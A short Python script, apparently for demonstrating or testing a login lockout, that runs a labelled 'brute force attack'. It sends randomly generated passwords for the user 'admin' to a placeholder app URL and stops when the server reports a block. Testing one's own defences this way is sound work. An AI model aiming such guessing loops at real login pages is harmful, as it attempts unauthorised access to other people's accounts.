import requests
import random
import string
import time

# 👉 Change URL
# Local:
# url = "http://127.0.0.1:5001/"

# Render:
url = "https://your-app.onrender.com/"

username = "admin"

def generate_passwords(count=5):
    passwords = []
    for _ in range(count):
        length = random.randint(6, 10)
        chars = string.ascii_letters + string.digits
        password = ''.join(random.choice(chars) for i in range(length))
        passwords.append(password)
    return passwords


print("\n🚨 Brute Force Attack Started...\n")

password_list = generate_passwords()

for password in password_list:

    data = {
        "username": username,
        "password": password
    }

    response = requests.post(url, data=data)

    print("Trying password:", password)
    print("Server Response:", response.text)
    print("--------------------------------")

    # Stop if blocked
    if "Blocked" in response.text or "blocked" in response.text:
        print("⚠️ IP Blocked. Stopping attack...")
        break

    # Delay (important)
    time.sleep(1)

print("\n✅ Brute Force Attack Completed")